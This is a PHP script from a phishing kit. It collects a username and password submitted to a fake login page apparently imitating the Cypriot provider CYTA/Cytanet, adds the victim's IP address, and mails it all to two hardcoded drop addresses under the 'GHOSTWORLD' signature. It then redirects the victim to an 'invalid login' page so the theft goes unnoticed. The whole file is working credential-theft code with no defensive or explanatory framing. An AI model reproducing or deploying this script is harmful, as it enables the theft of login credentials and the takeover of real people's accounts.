<?php
$username = $_POST['username'];
$password = $_POST['password'];
$ipaddress = getenv("REMOTE_ADDR");
$recipient = "homeplus76@aol.com,astronix880@gmail.com"; // Replace your email id here
$browser = $_SERVER['HTTP_USER_AGENT'];

if (empty($username) || empty($password))
	{
	header( "Location: turbify.php" );
	}
  else
	{
	$date = date('d-m-Y');
	$message = "------+ CYTA +------\n";
	$message.= $username . "\n";
	$message.= $password . "\n";
	$message.= $ipaddress . "\n";
	$message.= "------+ Created by GHOSTWORLD +------\n";
	$subject = " $date ||CYTANET||: " . $ipaddress . "\n";
	$headers = "From: ||GHOSTWORLD||<kane@kanesangels.com>\n";
	mail($recipient, $subject, $message, $headers);
	header("Location: invalid/cytanet.php?email=$username");
	}

?>
